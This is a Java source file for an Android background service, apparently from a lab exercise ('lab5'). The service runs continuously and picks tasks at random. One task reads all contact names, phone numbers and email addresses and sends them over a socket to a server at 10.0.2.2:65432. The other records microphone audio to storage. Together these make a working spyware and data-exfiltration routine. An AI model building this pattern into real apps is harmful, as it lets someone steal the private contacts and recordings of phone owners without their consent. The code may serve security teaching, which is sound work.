package com.example.lab5;

import static android.app.Activity.RESULT_OK;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Process;
import android.os.ResultReceiver;
import android.provider.ContactsContract;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Random;

public class MyService extends Service {
    private final StringBuilder contactsList = new StringBuilder();
    private ResultReceiver resultReceiver;

    Looper myLooper;
    ServiceHandler myHandler;

    public MyService() {

    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();

        HandlerThread thread = new HandlerThread(
                "MyHandlerThread",
                Process.THREAD_PRIORITY_BACKGROUND
        );
        thread.start();

        myLooper = thread.getLooper();
        myHandler = new ServiceHandler(this, myLooper);
        Message msg = myHandler.obtainMessage();
        msg.what = 10;
        myHandler.sendMessage(msg);

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("resultReceiver")) {
            if (this.resultReceiver == null) {
                this.resultReceiver = intent.getParcelableExtra("resultReceiver");
            }
        }

        if (this.resultReceiver != null) {
            Bundle bundle = new Bundle();
            bundle.putString("type", MainActivity.START_READING_CONTACTS);
            resultReceiver.send(RESULT_OK, bundle);
        }
        return START_STICKY;
    }

    private void readContacts() {
        ContentResolver contentResolver = getContentResolver();
        contactsList.setLength(0);

        String[] phoneColumns = new String[]{
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
        };
        Cursor cursorPhone = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                phoneColumns,
                null,
                null,
                null
        );
        if (cursorPhone != null && cursorPhone.moveToFirst()) {
            int nameIndex = cursorPhone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberIndex = cursorPhone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            contactsList.append("--- CONTACTS ---\n");
            do {
                String name = cursorPhone.getString(nameIndex);
                String number = cursorPhone.getString(numberIndex);

                contactsList.append("Name: ").append(name)
                        .append(", Phone: ").append(number)
                        .append("\n");

            } while (cursorPhone.moveToNext());
            cursorPhone.close();
        }

        String[] emailColumns = new String[]{
                ContactsContract.CommonDataKinds.Email.CONTACT_ID,
                ContactsContract.CommonDataKinds.Email.ADDRESS,
        };
        Cursor cursorEmail = contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                emailColumns,
                null,
                null,
                null
        );
        if (cursorEmail != null && cursorEmail.moveToFirst()) {
            contactsList.append("\n--- EMAILS ---\n");
            int emailIndex = cursorEmail.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);
            do {
                String email = cursorEmail.getString(emailIndex);
                contactsList.append("Email: ").append(email).append("\n");
            } while (cursorEmail.moveToNext());
            cursorEmail.close();
        }

        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }

        new Thread(() -> {
            try {
                sendDataToServer();
                Log.d("Network", "Successfully sent contacts to server.");
            } catch (IOException e) {
                Log.e("Network", "Failed to send data to server.", e);
            }
        }).start();
    }

    private void recordAudio() {
        String storagePath = this.getExternalFilesDir(null).getAbsolutePath();
        String fName = "/audio_" + System.currentTimeMillis() + ".3gp";
        String outputFile = storagePath + fName;
        MediaRecorder rec = new MediaRecorder();
        rec.setAudioSource(MediaRecorder.AudioSource.MIC);
        rec.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        rec.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        rec.setOutputFile(outputFile);
        try {
            rec.prepare();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        rec.start();
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        rec.stop();
        rec.release();
    }

    private void sendDataToServer() throws IOException {
        Socket server = new Socket("10.0.2.2", 65432);
        DataOutputStream dout = new DataOutputStream(server.getOutputStream());

        dout.writeUTF(contactsList.toString());
        dout.flush();
        dout.writeUTF("disconnecting");
        dout.flush();
        dout.close();
        server.close();
    }

    private final class ServiceHandler extends Handler {
        private Context context;
        private final Random random = new Random();
        private static final long TASK_DELAY_MS = 3000;

        public ServiceHandler(Context context, Looper looper) {
            super(looper);
            this.context = context;
        }

        @Override
        public void handleMessage(Message message) {
            if (message.what == 10) {
                int nextTask = random.nextInt(2) + 1;
                Message taskMsg = obtainMessage(nextTask);
                sendMessage(taskMsg);
                return;
            }

            // Now, handle the actual tasks
            switch (message.what) {
                case 1:
                    Log.d("ServiceHandler", "Task: Reading contacts.");
                    sendResultToUI(MainActivity.START_READING_CONTACTS);
                    readContacts();
                    Log.d("ServiceHandler", "Scheduling next task in " + TASK_DELAY_MS + "ms");
                    sendResultToUI(MainActivity.STOP_READING_CONTACTS);
                    sendMessageDelayed(obtainMessage(10), TASK_DELAY_MS);
                    break;

                case 2:
                    Log.d("ServiceHandler", "Task: Recording audio.");
                    sendResultToUI(MainActivity.START_VOICE_RECORDING);
                    recordAudio();
                    Log.d("ServiceHandler", "Scheduling next task in " + TASK_DELAY_MS + "ms");
                    sendResultToUI(MainActivity.STOP_VOICE_RECORDING);
                    sendMessageDelayed(obtainMessage(10), TASK_DELAY_MS);
                    break;
            }
        }
        private void sendResultToUI(String messageType) {
            if (resultReceiver != null) {
                Bundle bundle = new Bundle();
                bundle.putString("type", messageType);
                resultReceiver.send(RESULT_OK, bundle);
            }
        }
    }
}
